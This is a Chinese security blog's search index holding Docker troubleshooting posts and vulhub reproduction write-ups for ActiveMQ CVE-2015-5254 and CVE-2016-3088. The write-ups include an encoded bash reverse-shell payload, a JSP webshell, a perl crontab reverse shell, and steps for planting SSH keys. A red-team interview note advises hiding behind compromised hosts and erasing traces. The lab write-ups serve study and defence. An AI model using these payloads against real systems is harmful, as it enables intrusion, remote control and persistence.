<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Docker-Compose 自动创建的网桥与局域网冲突的解决方案</title>
    <url>/2022/07/07/Docker-Compose-%E8%87%AA%E5%8A%A8%E5%88%9B%E5%BB%BA%E7%9A%84%E7%BD%91%E6%A1%A5%E4%B8%8E%E5%B1%80%E5%9F%9F%E7%BD%91%E5%86%B2%E7%AA%81%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>一、问题描述</p>
<p>在使用 docker-compose 部署应用时， docker 默认的网络模式是 bridge ，默认网段是 172.17.0.1&#x2F;16。十分不巧的是我们自己物理机的局域网也使用的是 172.18.0.1&#x2F;16 的网段。在执行 docker-compose -f docker-compose.yml up -d 部署服务后，自动生成的网桥会依次使用 172.18.x.x，然而悲催的事情发生了。docker 生成的网桥与局域网冲突了。</p>
<p>二、解决方案</p>
<pre><code>1、停止docker
docker-compose -f docker-compose.yml down
2、删除doker创建网桥
docker nerwork rm br-xxx(注：如果正常关闭容器不会有残留的网桥)
3、修改 daemon.json
vi /etc/docker/daemon.json

添加以下内容：
&quot;default-address-pools&quot; : [
&#123;
  &quot;base&quot; : &quot;192.168.0.0/16&quot;,
  &quot;size&quot; : 24
&#125;
]
4、重启docekr
sudo systemctl daemon-reload
sudo systemctl start docker
5、重新启动docker-compose
docker-compose -f docker-compose.yml up -d
</code></pre>
]]></content>
      <categories>
        <category>docker</category>
        <category>debug</category>
      </categories>
  </entry>
  <entry>
    <title>docker环境代理配置</title>
    <url>/2022/07/07/docker%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>一、背景</p>
<p>记一次在客户现场配置环境遇到的问题，靶机不出网，通过socks5代理临时出网，这里客户配置了只能curl和yum，docker并不走代理，所以导致了docker在配置国内源后，并不能进行更新。</p>
<span id="more"></span>
<p>二、docker代理配置</p>
<pre><code>sudo mkdir -p /etc/systemd/system/docker.service.d
sudo touch /etc/systemd/system/docker.service.d/proxy.conf
</code></pre>
<p>创建好文件后，将一下内容写入文件</p>
<pre><code>[Service]
Environment=&quot;HTTP_PROXY=http://proxy.example.com:8080/&quot;
Environment=&quot;HTTPS_PROXY=http://proxy.example.com:8080/&quot;
Environment=&quot;NO_PROXY=localhost,127.0.0.1,.example.com&quot;
</code></pre>
<p>三、重启docker</p>
<pre><code>重启docker daemon
sudo systemctl daemon-reload
sudo systemctl restart docker
查看是否配置成功
systemctl show --property=Environment docker
</code></pre>
<p>此时docker可以正常进行更新。</p>
]]></content>
      <categories>
        <category>docker</category>
        <category>debug</category>
      </categories>
  </entry>
  <entry>
    <title>Apache ActiveMQ序列化漏洞(CVE-2015-5254)复现</title>
    <url>/2022/03/30/vulhub-cve-2015-5254/</url>
    <content><![CDATA[<p>一、介绍<br>1.1 简介</p>
<p>ActiveMQ 是Apache的一款JAVA开源消息中间件，支持Java消息服务、集群、SpringFrameword等。属于消息队列组件。<br>    消息队列组件：分布式系统中的重要组件，主要解决应用耦合、异步消息、流量削峰等</p>
<p>1.2 影响版本</p>
<pre><code>    Apache ActiveMQ &lt; 5.x
</code></pre>
<span id="more"></span>
<p>1.3 漏洞描述</p>
<p>该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的java消息服务(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
<p>1.4 利用限制</p>
<pre><code>a、版本需要符合
b、能够立即执行代码：能够有弱密码登录查看消息队列
c、没有查看队列所有消息的用户名和密码下，只能管理员/用户去点击我们插入的消息才能触发（比较鸡肋，但可以写入创建用户命令等待管理员点击查看，概率很大！）
</code></pre>
<p>1.5 可能存在的业务场景</p>
<p>消息队列在大型电子商务类网站（JD、淘宝等）深入应用，主要消除高并发访问高峰，加快网站响应速度。</p>
<pre><code>（例如：不使用消息队列用户请求会直接写入数据库，在高并发情况下会对数据库造成大压力，使系统响应延迟加剧。
在使用消息队列后，用户的请求发给队列后不会立即返回，如有时提交了订单，系统提示：“您提交了订单、请等待系统确认！”
再由消息队列组件从消息队列中获取数据，异步写入数据库，从而响应延迟得以改善）
</code></pre>
<p>二、环境搭建</p>
<p>vulhub 启动 activemq&#x2F;CVE-2015-5254&#x2F;环境</p>
<pre><code>命令：docker-compose up -d
</code></pre>
<img src="/2022/03/30/vulhub-cve-2015-5254/1.png" class>

<p>三、漏洞复现</p>
<p>3.1 漏洞利用过程</p>
<pre><code>a.构成(使用ysoserial)可执行命令的序列化对象
b.作为一个消息,发送给目标的61616端口    
c.访问web管理页面,读取消息,触发漏洞
</code></pre>
<p>3.2 使用jmet进行漏洞利用</p>
<pre><code>Github地址：https://github.com/matthiaskaiser/jmet/releases
</code></pre>
<p>a、下载jmet<br>b、同级目录下创建external目录<br>c、构造队列消息发送到目标服务器（这里为在目标服务器&#x2F;tmp目录创建一个文件）</p>
<pre><code>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -Y &quot;touch /tmp/success&quot; -Yp ROME [ip] [port]
</code></pre>
<img src="/2022/03/30/vulhub-cve-2015-5254/2.png" class>

<p>3.3 访问站点</p>
<p>访问web站点查看创建的消息队列是否成功（这里前提需要拿到BasicHTML认证的账号密码，这里为了演示admin:admin）<br>访问 <a href="http://110.42.181.61:8161/admin/browse.jsp?JMSDestination=event">http://110.42.181.61:8161/admin/browse.jsp?JMSDestination=event</a></p>
<img src="/2022/03/30/vulhub-cve-2015-5254/3.png" class>

<p>成功查看到创建的消息队列，当用户点击消息，即可成功执行。</p>
<img src="/2022/03/30/vulhub-cve-2015-5254/4.png" class>
<img src="/2022/03/30/vulhub-cve-2015-5254/5.png" class>

<p>可以看到成功执行</p>
<p>四、漏洞利用（反弹shell）</p>
<p>a、攻击者首先监听一个端口，例如nc -lvvp 19111<br>b、发送bash弹shell的命令payload到服务器</p>
<pre><code>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAxLzE5MTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME [ip] [port]
</code></pre>
<p>c、点击访问该事件，payload便会执行（真实攻击场景下，此过程需要等待管理员点击<br>d、成功连接shell</p>
<p>五、修复建议</p>
<p>a、升级到最新版本<br>b、有WAF的可以配置相关规则进行拦截</p>
]]></content>
      <categories>
        <category>vulhub</category>
        <category>activemq</category>
      </categories>
  </entry>
  <entry>
    <title>vulhub cve-2016-3088</title>
    <url>/2022/04/06/vulhub-cve-2016-3088/</url>
    <content><![CDATA[<p>一、介绍<br>1.1 简介</p>
<p>ActiveMQ 是Apache的一款JAVA开源消息中间件，支持Java消息服务、集群、SpringFrameword等。属于消息队列组件。<br>    消息队列组件：分布式系统中的重要组件，主要解决应用耦合、异步消息、流量削峰等</p>
<p>1.2 影响版本</p>
<pre><code>    Apache ActiveMQ 5.x~5.14.0
</code></pre>
<span id="more"></span>
<p>1.3 漏洞描述</p>
<p>ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用。2016年4月14日，国外安全研究人员 Simon Zuckerbraun 曝光 Apache ActiveMQ Fileserver 存在多个安全漏洞，可使远程攻击者用恶意代码替代Web应用，在受影响系统上执行远程代码（CVE-2016-3088）。</p>
<p>1.4 利用限制</p>
<pre><code>a、ActiveMQ版本低于5.12.x
b、需要弱密码登录
</code></pre>
<p>二、环境搭建</p>
<p>vulhub 启动 activemq&#x2F;CVE-2016-3088&#x2F;环境</p>
<pre><code>命令：docker-compose up -d
</code></pre>
<img src="/2022/04/06/vulhub-cve-2016-3088/1.png" class>

<p>三、漏洞复现</p>
<p>3.1 直接写入shell</p>
<p>好处是方便，但是fileserver不解析jsp，admin和api都需要登录才能访问，所以需要结合弱密码漏洞</p>
<p>首先探查当前系统路径,访问<a href="http://ip//admin/test/systemProperties.jsp">http://ip//admin/test/systemProperties.jsp</a>    </p>
<img src="/2022/04/06/vulhub-cve-2016-3088/2.png" class>

<p>PUT上传Jsp的Webshell到fileserver目录下</p>
<pre><code>&lt;%@ page import=&quot;java.io.*&quot;%&gt;

&lt;%
    out.print(&quot;Cytosine Test&lt;br&gt;&quot;);

    String strcmd = request.getParameter(&quot;cmd&quot;);
     String line = null;

    Process p = Runtime.getRuntime().exec(strcmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));

    while((line=br.readLine())!=null)&#123;
    out.print(line+&quot;&lt;br&gt;&quot;); &#125;
%&gt;
</code></pre>
<img src="/2022/04/06/vulhub-cve-2016-3088/3.png" class>

<p>响应为204说明成功</p>
<p>接下来MOVE并进行重新命名</p>
<p>Destination: file:&#x2F;&#x2F; &#x2F;opt&#x2F;apache-activemq-5.11.1&#x2F;webapps&#x2F;admin&#x2F;shell.jsp</p>
<img src="/2022/04/06/vulhub-cve-2016-3088/4.png" class>

<p>执行命令</p>
<img src="/2022/04/06/vulhub-cve-2016-3088/5.png" class>

<p>3.2 crontab</p>
<p>利用定时器，自动化弹shell；注意，换行一定要\n，不能是\r\n，否则crontab执行会失败；这里利用perl语言写的反弹到VPS上；</p>
<pre><code>*/1 * * * * root /usr/bin/perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=21;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;
##
</code></pre>
<p>操作步骤与3.1一致，设置监听，等一会即可获取结果</p>
<p>四、漏洞利用（写入ssh）</p>
<p>a、攻击者首先生成一个公钥<br>b、PUT上传公钥<br>c、MOVE移动公钥到&#x2F;root&#x2F;.ssh&#x2F;并重命名为authorized_keys<br>d、连接ssh</p>
<p>五、修复建议</p>
<p>a、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本；<br>b、通过移除 conf\jetty.xml 的以下配置来禁用 ActiveMQ Fileserver 功能；</p>
]]></content>
      <categories>
        <category>vulhub</category>
        <category>activemq</category>
      </categories>
  </entry>
  <entry>
    <title>win10子系统无法使用ssh连接</title>
    <url>/2022/08/08/win10%E5%AD%90%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8ssh%E8%BF%9E%E6%8E%A5/</url>
    <content><![CDATA[<p>一、背景</p>
<p>搭建frp ssh隧道<br>攻击机：win10子系统 kali<br>服务端：vps<br>客户端：centos 7 mini</p>
<p>在成功搭建frp后，发现无法ssh到内网的centos7，一开始以为是centos7的问题，于是对centos的sshd进行重装，发现并没有解决，随后又重装的了整个靶机，结果还是不行。。。</p>
<p>然后又使用正常的ssh进行登录发现win10本机可以ssh到centos上，但是kali子系统并不行</p>
<p>报错为：<br>    Warning: Permanently added ‘192.168.2.128’ (ED25519) to the list of known …</p>
<p>二、解决办法<br>    vi &#x2F;etc&#x2F;ssh&#x2F;ssh_config<br>    在最后修改为：<br>    HashKnownHosts no<br>    GSSAPIAuthentication no<br>    重启终端即可</p>
]]></content>
      <categories>
        <category>debug</category>
      </categories>
  </entry>
  <entry>
    <title>红队面试整理（含答案）</title>
    <url>/2022/07/12/%E7%BA%A2%E9%98%9F%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89/</url>
    <content><![CDATA[<p>1、渗透的时候如何隐藏自己的身份</p>
<p>·渗透前挂好vpn，将自己的ip代理到国外，或者通过telnet到肉鸡上，通过肉鸡建立跳板进行渗透<br>·渗透时使用代理池，频繁更换ip<br>·渗透后及时清理渗透痕迹</p>
<p>2、红队流程</p>
<p>信息收集→打点→内网渗透→横向移动→权限维持→清理痕迹</p>
<p>3、信息收集包含哪些内容</p>
<p>·目标ip、域名、子域名、中间件、cms、c段、端口、whois反查<br>·字典（公司邮箱、电话、人员信息等）</p>
<p>未完待续。。。。</p>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
  </entry>
</search>
